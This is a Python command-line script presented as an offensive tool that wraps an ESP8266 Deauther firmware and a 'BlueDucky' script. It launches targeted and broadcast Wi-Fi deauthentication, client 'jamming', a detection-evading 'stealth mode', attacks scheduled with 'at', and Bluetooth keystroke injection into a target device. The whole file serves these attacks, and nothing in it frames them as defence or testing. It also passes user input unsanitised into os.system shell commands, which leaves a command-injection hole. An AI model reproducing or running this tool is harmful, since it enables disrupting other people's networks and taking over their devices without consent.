import argparse
import os
import time
import json

# -------------------------------------------
# ESP8266 - Wi-Fi Deauth & BlueDucky Keystroke Injection Tool
# -------------------------------------------
# Features:
# - Performs targeted Wi-Fi deauthentication attacks
# - Broadcast deauth attack to disconnect all clients
# - Selective jamming of specific Wi-Fi clients or access points
# - Adjustable attack duration and intervals
# - Stealth mode to randomize attack patterns
# - Integrates BlueDucky for Bluetooth-based keystroke injection
# - Supports automated reconnection for continuous attacks
# - Enables attack scheduling for time-based execution
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
# - BlueDucky.py for Bluetooth keystroke injection
#
# Usage:
# 1. Scan for Wi-Fi networks:
#    python esp8266_wifi_jammer.py --scan
# 2. Perform a deauth attack on a specific network:
#    python esp8266_wifi_jammer.py --deauth --target AA:BB:CC:DD:EE:FF
# 3. Launch a broadcast deauth attack (disconnect all clients):
#    python esp8266_wifi_jammer.py --deauth-all
# 4. Selectively jam a Wi-Fi client:
#    python esp8266_wifi_jammer.py --jam --target AA:BB:CC:DD:EE:FF
# 5. Enable stealth mode for randomized attack intervals:
#    python esp8266_wifi_jammer.py --stealth
# 6. Inject keystrokes via BlueDucky over Bluetooth:
#    python esp8266_wifi_jammer.py --blueducky --target XX:XX:XX:XX:XX:XX --payload "Hello World"
# 7. Enable automated attack scheduling:
#    python esp8266_wifi_jammer.py --schedule --time 22:00 --deauth-all
# -------------------------------------------

def scan_wifi():
    """Scans for available Wi-Fi networks."""
    print("[+] Scanning for Wi-Fi networks...")
    os.system("python deauther.py scan > wifi_scan_results.txt")
    print("[✔] Scan complete. Results saved to wifi_scan_results.txt")

def deauth_attack(target):
    """Performs a deauthentication attack on a target AP."""
    print(f"[+] Sending deauth packets to {target}...")
    os.system(f"python deauther.py deauth {target}")
    print("[✔] Deauth attack executed.")

def deauth_all():
    """Performs a broadcast deauthentication attack to disconnect all clients."""
    print("[+] Launching broadcast deauth attack...")
    os.system("python deauther.py deauth-all")
    print("[✔] Broadcast deauth attack completed.")

def jam_wifi(target):
    """Performs a selective Wi-Fi jamming attack on a target device."""
    print(f"[+] Jamming Wi-Fi client {target}...")
    os.system(f"python deauther.py jam {target}")
    print("[✔] Wi-Fi jamming executed.")

def enable_stealth_mode():
    """Enables stealth mode to randomize attack intervals and avoid detection."""
    print("[+] Enabling stealth mode...")
    os.system("python deauther.py stealth")
    print("[✔] Stealth mode activated.")

def inject_bluetooth_keystrokes(target, payload):
    """Injects keystrokes remotely into a Bluetooth keyboard using BlueDucky."""
    print(f"[+] Injecting Bluetooth keystrokes via BlueDucky to {target}: {payload}")
    os.system(f"python blueducky_hijacker.py --inject '{payload}' --target {target}")
    print("[✔] Bluetooth keystrokes injected successfully.")

def schedule_attack(time, command):
    """Schedules an attack to execute at a specific time."""
    print(f"[+] Scheduling attack at {time}: {command}")
    os.system(f"echo 'python esp8266_wifi_jammer.py {command}' | at {time}")
    print("[✔] Attack scheduled.")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Wi-Fi Deauth & BlueDucky Keystroke Injection Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for available Wi-Fi networks")
    parser.add_argument("--deauth", action='store_true', help="Perform a deauth attack on a specific target")
    parser.add_argument("--deauth-all", action='store_true', help="Perform a broadcast deauth attack")
    parser.add_argument("--jam", action='store_true', help="Jam a specific Wi-Fi client")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode for randomized attacks")
    parser.add_argument("--blueducky", action='store_true', help="Inject keystrokes via BlueDucky over Bluetooth")
    parser.add_argument("--schedule", action='store_true', help="Schedule an attack at a specific time")
    parser.add_argument("--target", type=str, help="Target MAC address for deauth, jamming, or BlueDucky attacks")
    parser.add_argument("--payload", type=str, help="Payload to inject via BlueDucky")
    parser.add_argument("--time", type=str, help="Time to execute the scheduled attack (HH:MM format)")
    args = parser.parse_args()

    if args.scan:
        scan_wifi()
    elif args.deauth and args.target:
        deauth_attack(args.target)
    elif args.deauth_all:
        deauth_all()
    elif args.jam and args.target:
        jam_wifi(args.target)
    elif args.stealth:
        enable_stealth_mode()
    elif args.blueducky and args.target and args.payload:
        inject_bluetooth_keystrokes(args.target, args.payload)
    elif args.schedule and args.time:
        schedule_attack(args.time, "--deauth-all")
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
